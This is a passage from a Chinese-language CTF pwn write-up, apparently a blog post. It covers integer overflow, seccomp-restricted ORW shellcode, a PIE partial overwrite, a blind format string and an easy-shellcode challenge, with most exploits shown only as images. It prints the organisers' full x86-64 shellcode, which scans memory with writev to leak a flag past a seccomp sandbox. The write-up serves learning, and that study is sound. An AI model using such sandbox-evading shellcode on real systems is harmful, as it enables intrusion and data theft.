src="https://i.niupic.com/images/2022/10/17/a9tH.png"><br>大概逻辑理清后来找一找后门函数或’/bin/sh’（其实一来就该找？<br><img src="https://i.niupic.com/images/2022/10/17/a9ty.png"><br>再关注一下刚刚发现的两个整形溢出点，看一下有无类型转换之类的，还真有<br><img src="https://i.niupic.com/images/2022/10/17/a9tz.png"><br><img src="https://i.niupic.com/images/2022/10/17/a9tM.png"></li><li><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><img src="https://i.niupic.com/images/2022/10/17/a9tv.png"></li></ul></li><li><h2 id="ret2shellcode-orw"><a href="#ret2shellcode-orw" class="headerlink" title="ret2shellcode(orw)"></a>ret2shellcode(orw)</h2><ul><li><h3 id="checksec-IDA-gdb"><a href="#checksec-IDA-gdb" class="headerlink" title="checksec+IDA+gdb"></a>checksec+IDA+gdb</h3>大概流程就是mmap分配一个可写可执行的空间，让你写入code并执行<br><img src="https://i.niupic.com/images/2022/10/17/a9tw.png"><br>尝试shellcraft.sh()后未成功，gdb调试发现系统调用时进程崩溃,显示“bad syscall” 搜索后发现有沙盒<br>第一次见 并在init函数里发现函数prctl 禁止了execve调用，仅允许open、read、write读取flag<br><img src="https://i.niupic.com/images/2022/10/17/a9tN.png"></li><li><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3>利用pwntools写orw的汇编，发现长度过长，只能手写<br><img src="https://i.niupic.com/images/2022/10/17/a9tx.png"><br>换成如下(其实还是网上找的code,原code还是长了,在出题人提示下删掉了重复的参数布置过程)<br><img src="https://i.niupic.com/images/2022/10/17/a9tO.png"></li></ul></li><li><h2 id="ASCII-ART-partial-overwrite"><a href="#ASCII-ART-partial-overwrite" class="headerlink" title="ASCII_ART(partial overwrite)"></a>ASCII_ART(partial overwrite)</h2><ul><li><h3 id="checksec-IDA-2"><a href="#checksec-IDA-2" class="headerlink" title="checksec+IDA"></a>checksec+IDA</h3>简洁的main函数（并不影响我看不懂<br><img src="https://i.niupic.com/images/2022/10/17/a9tw.png"><br>找找后门，有好东西<br><img src="https://i.niupic.com/images/2022/10/17/a9tQ.png"><br>gdb发现输入是可以覆盖返回地址的，再加上开了pie，那就是partial overwrite<br><img src="https://i.niupic.com/images/2022/10/17/a9tE.png"></li><li><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><img src="https://i.niupic.com/images/2022/10/17/a9tA.png"></li></ul></li><li><h2 id="Another-Checkin-Pwn-blind-fmtstr"><a href="#Another-Checkin-Pwn-blind-fmtstr" class="headerlink" title="Another_Checkin_Pwn(blind fmtstr)"></a>Another_Checkin_Pwn(blind fmtstr)</h2>没做出来，还是写一下（也不知道binary为啥没dump下来<br>没文件IDA不了了，输入字符发现回显，那就是格式化字符串盲打了，换了好多种写法，最终还是没<br>dump下来，(记住有循环…不用每次都remote)<br>还有两个没删的脚本放一放，以后再回来看为啥不行<br><img src="https://i.niupic.com/images/2022/10/17/a9tR.png"><br><img src="https://i.niupic.com/images/2022/10/17/a9tX.png"></li><li><h2 id="Easy-shellcode"><a href="#Easy-shellcode" class="headerlink" title="Easy shellcode"></a>Easy shellcode</h2>没有写出来，不过确实学到很多<ul><li><h3 id="checksec-IDA-seccomp-tools"><a href="#checksec-IDA-seccomp-tools" class="headerlink" title="checksec+IDA+seccomp-tools"></a>checksec+IDA+seccomp-tools</h3>mmap开了一块空间存入flag.txt，再mmap了一段可执行的空间写code，空间内开头的一段code是清空寄存器(还傻乎乎的asm反汇编，gdb就能看啊),后面的空间就交给我们操作。<br><img src="https://i.niupic.com/images/2022/10/17/a9tC.png"><br>重要的一点就是寄存器并没有完全清空，r15里还存有初始地址，可以通过找到text段的地址<br><img src="https://i.niupic.com/images/2022/10/17/a9tD.png"><br>找到了prctl，看一下沙盒规则,发现见过的调用全部ban掉 （其实经测试read，open，write是可以用的，但可能是参数布置的问题读到了但是没有打印出来，错失白给的机会呜呜，反馈后更新了附件）<br><img src="https://i.niupic.com/images/2022/10/17/a9tB.png"><br><img src="https://i.niupic.com/images/2022/10/17/a9tS.png"></li><li><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3>最开始的想法是既然能控制程序回到text段，那就可以重新控制参数并调用prtcl函数更改沙盒规则，多次尝试均失败（应该是不行的）<br><img src="https://i.niupic.com/images/2022/10/17/a9tF.png"><br>还有关键问题找不到buf段的位置，磨了一整天也没搞出来</li></ul></li></ul><h3 id="附上官方wp"><a href="#附上官方wp" class="headerlink" title="附上官方wp"></a>附上官方wp</h3><p>  ```python<br>sc = “””<br>lea rsp, [rip+0x500]<br>lea r13, [rip]<br>mov r14, 0xfffffff00000<br>and r13, r14 # 使r13页对齐<br>loop:<br>  add r13, 0x1000<br>  pop r14 #回收上一次push的r13地址<br>  pop r14<br>  push 0x1 #因为writev的参数是一个结构体iovec，这里的1表示iov_len<br>  push r13<br>  mov rdi, 2<br>  mov rsi, rsp<br>  mov rdx, 1<br>  mov rcx, 0<br>  mov rax, 20<br>  syscall<br>  cmp rax, 0  #判断writev的返回值是否为负数，即该页是否可读<br>  jl loop # 若不可读再次循环<br>mov rdi, [r13]<br>cmp edi, 0x54435354 #判断字符串是否以TSCT开头<br>jnz loop<br>push 31<br>push r13<br>mov rdi, 2<br>mov rsi, rsp<br>mov rdx, 1<br>mov rcx, 0<br>mov rax, 20<br>syscall #打印flag<br>jmp $<br>“””</p></li></ul><p>```<br>    - ### question<br>        这个地方的文件描述符错误应该是2，系统调用可用writev<br>          <img src="https://i.niupic.com/images/2022/10/17/a9tu.png"><br>        - ## 堆相关<br>          其实之前有花时间看过堆的内容，可是太多而且不好理解，看了啥也没记住，下去得好好学一下</p><ul><li><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1>光搁pwn坐牢了，其实web学的时间比pwn更长，结果一题没出<br>感觉pwn找资料好难，有没有啥blog分享一下<br>最后引一段从0到1的话，好好去学pwn的基础<br><img src="https://i.niupic.com/images/2022/10/17/a9tT.png"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> WriteUP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
